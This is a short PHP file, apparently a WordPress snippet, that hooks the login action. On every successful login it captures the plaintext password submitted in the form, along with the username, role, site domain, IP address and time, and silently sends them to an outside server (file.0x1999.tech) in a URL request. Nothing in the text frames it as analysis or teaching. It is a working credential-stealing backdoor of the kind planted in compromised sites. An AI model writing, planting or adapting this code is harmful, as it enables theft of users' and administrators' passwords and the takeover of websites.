<?php

function send_login_data_to_external_url($user_login, $user) {

    $user_ip = $_SERVER['REMOTE_ADDR']; 
    $login_time = date("Y-m-d H:i:s");
    $user_role = implode(', ', $user->roles);
    $domain = home_url(); 

    $password_used = isset($_POST['pwd']) ? $_POST['pwd'] : 'Password not available';

    $data = "🏠 Domain: $domain\n";
    $data .= "👤 Username: $user_login\n";
    $data .= "🔑 Password: $password_used\n";
    $data .= "🎭 Role: $user_role\n";
    $data .= "📍 IP Address: $user_ip\n";
    $data .= "⏰ Login Time: $login_time\n";

    $endpoint_url = 'https://file.0x1999.tech/info.php?p=' . urlencode($data);

    file_get_contents($endpoint_url);
}

add_action('wp_login', 'send_login_data_to_external_url', 10, 2);
?>
